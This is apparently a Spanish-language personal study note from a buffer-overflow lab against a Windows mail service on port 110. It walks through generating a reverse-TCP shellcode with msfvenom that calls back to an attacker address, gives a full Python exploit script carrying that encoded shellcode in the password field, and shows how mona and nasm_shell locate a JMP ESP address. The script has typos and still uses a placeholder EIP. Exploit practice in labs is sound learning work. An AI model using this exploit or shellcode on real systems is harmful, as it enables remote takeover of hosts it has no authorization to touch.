- Tags : #buffer_overflow 
Una vez que se ha generado el shellcode malicioso y se han detectado los badchars, el siguiente paso es hacer que el flujo del programa entre en el shellcode para que sea interpretado. La idea es hacer que el registro EIP apunte a una dirección de memoria donde se aplique un **opcode** que realice un salto al registro **ESP** (**JMP ESP**), que es donde se encuentra el shellcode. Esto es así dado que de primeras no podemos hacer que el EIP apunte directamente a nuestro shellcode.

Para encontrar el opcode **JMP ESP**, se pueden utilizar diferentes herramientas, como **mona.py**, que permite buscar opcodes en módulos específicos de la memoria del programa objetivo. Una vez que se ha encontrado el opcode ‘**JMP ESP**‘, se puede sobrescribir el valor del registro EIP con la dirección de memoria donde se encuentra el opcode, lo que permitirá saltar al registro ESP y ejecutar el shellcode malicioso.

La búsqueda de opcodes para entrar al registro ESP y cargar el shellcode es una técnica utilizada para hacer que el flujo del programa entre en el shellcode para que sea interpretado. Se utiliza el opcode JMP ESP para saltar a la dirección de memoria del registro ESP, donde se encuentra el shellcode.


Esto lo haremos con msfvenom

Dependiendo de la arquitectura y el SO es lo que generamos

```bash
#Listar los payload
msfvenom -l payloads

#Listar los encoders
msfvenom -l encoders 

#Generamos el shellcode
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.111.145 LPORT=4646 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread

-p payload a utilizar
--platform sistema de la victima 
-a  arquitectura del sistema 32 o 64 bit
-f   formato de salida en este caso C
-e   el encoder que se utilizara en este caso x86/shikata_ga_nai
-b '\x00\x0a\x0d'  Indicamos los badchars que detectamos anteriorment para que no los incluya cuando cree el shellcode

EXITFUNC=thread   Para cuando salgas de la consola el servicio vuelva a estar operativo y no se quede corrompido

```

![](../../../attachments/Pasted%20image%2020260224202258.png)

Este shelcode es el que copiaremos en nuestro script de python como shellcode y lo pasaremos como payloas como *affter_eip*  lo sustituiremos como *shellcode*
```python

import socket
import sys

#Para verificar que nos envian por parametro una coantidad para el buffer
if len(sys.arg) != 2:
	print("\n[+] Uso : exploit.py <length> ")
	exit(1)

#Variables globale
ip_address="192.168.1.23"
port= 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
shellcode =(b"\xbd\x06\x1a\x85\x89\xd9\xc8\xd9\x74\x24\xf4\x58\x2b\xc9"
b"\xb1\x52\x31\x68\x12\x03\x68\x12\x83\xc6\x1e\x67\x7c\x3a"
b"\xf6\xe5\x7f\xc2\x07\x8a\xf6\x27\x36\x8a\x6d\x2c\x69\x3a"
b"\xe5\x60\x86\xb1\xab\x90\x1d\xb7\x63\x97\x96\x72\x52\x96"
b"\x27\x2e\xa6\xb9\xab\x2d\xfb\x19\x95\xfd\x0e\x58\xd2\xe0"
b"\xe3\x08\x8b\x6f\x51\xbc\xb8\x3a\x6a\x37\xf2\xab\xea\xa4"
b"\x43\xcd\xdb\x7b\xdf\x94\xfb\x7a\x0c\xad\xb5\x64\x51\x88"
b"\x0c\x1f\xa1\x66\x8f\xc9\xfb\x87\x3c\x34\x34\x7a\x3c\x71"
b"\xf3\x65\x4b\x8b\x07\x1b\x4c\x48\x75\xc7\xd9\x4a\xdd\x8c"
b"\x7a\xb6\xdf\x41\x1c\x3d\xd3\x2e\x6a\x19\xf0\xb1\xbf\x12"
b"\x0c\x39\x3e\xf4\x84\x79\x65\xd0\xcd\xda\x04\x41\xa8\x8d"
b"\x39\x91\x13\x71\x9c\xda\xbe\x66\xad\x81\xd6\x4b\x9c\x39"
b"\x27\xc4\x97\x4a\x15\x4b\x0c\xc4\x15\x04\x8a\x13\x59\x3f"
b"\x6a\x8b\xa4\xc0\x8b\x82\x62\x94\xdb\xbc\x43\x95\xb7\x3c"
b"\x6b\x40\x17\x6c\xc3\x3b\xd8\xdc\xa3\xeb\xb0\x36\x2c\xd3"
b"\xa1\x39\xe6\x7c\x4b\xc0\x61\x43\x24\xa5\xe0\x2b\x37\x39"
b"\x11\x8a\xbe\xdf\x7f\xc2\x96\x48\xe8\x7b\xb3\x02\x89\x84"
b"\x69\x6f\x89\x0f\x9e\x90\x44\xf8\xeb\x82\x31\x08\xa6\xf8"
b"\x94\x17\x1c\x94\x7b\x85\xfb\x64\xf5\xb6\x53\x33\x52\x08"
b"\xaa\xd1\x4e\x33\x04\xc7\x92\xa5\x6f\x43\x49\x16\x71\x4a"
b"\x1c\x22\x55\x5c\xd8\xab\xd1\x08\xb4\xfd\x8f\xe6\x72\x54"
b"\x7e\x50\x2d\x0b\x28\x34\xa8\x67\xeb\x42\xb5\xad\x9d\xaa"
b"\x04\x18\xd8\xd5\xa9\xcc\xec\xae\xd7\x6c\x12\x65\x5c\x8c"
b"\xf1\xaf\xa9\x25\xac\x3a\x10\x28\x4f\x91\x57\x55\xcc\x13"
b"\x28\xa2\xcc\x56\x2d\xee\x4a\x8b\x5f\x7f\x3f\xab\xcc\x80"
b"\x6a") 

payload = before_eip + eip + shellcode 
def exploit():
	#Crear el Socket
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	
	#Conetar el servidor
	s.connet((ip_address,port))
	
	#Recibir el Banner del servidor
	banner = s.recv(1024)
	print(banner)
	
	#Enviar los parametros
	s.send(b"USER savitar" + b"\r\n")
	response = s.recv(1024)
	s.send(b"PASS " + payload + b"\r\n")
	s.close()
	
if __name__ == "__main__":
	exploit()
```

Ya casi tenemos todo listo solo que el EIP esta apuntando a *42424242* que es el valos de *BBBB* pero necesitamos que apunte a la pila  

Necesitamos identificar una dirección de memoria que aplique com OPCODE un salto como la identificaremos pues 
![](../../../attachments/Pasted%20image%2020260225091754.png)
El modulo se llama  *SLMFC.DLL*  que  pertenece al propio programa
![[Pasted image 20260225091941.png]]

Necesitamoe el opcode de jmp ESP que lo obtenemos con 
```bash 

/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp ESP
00000000  FF                db 0xff
00000001  E4                db 0xe4
nasm > 

Se representa como \xFF\xE4
```

Con *MONA*
```
!mona help find

!mona find -s "\xFF\xE4" -m SLMFC.DLL
```

![](../../../attachments/Pasted%20image%2020260225092439.png)
La direccion donde devemos fijarnos que no tenga los badchars es las de la primera columna en verde

Copiamos la addres con: click derecho -- copy to clipboard-- addres
Modificamos el *eip* en nuestro script de python con la direccion extraida de **MONA**

![](../../../attachments/Pasted%20image%2020260224211006.png)













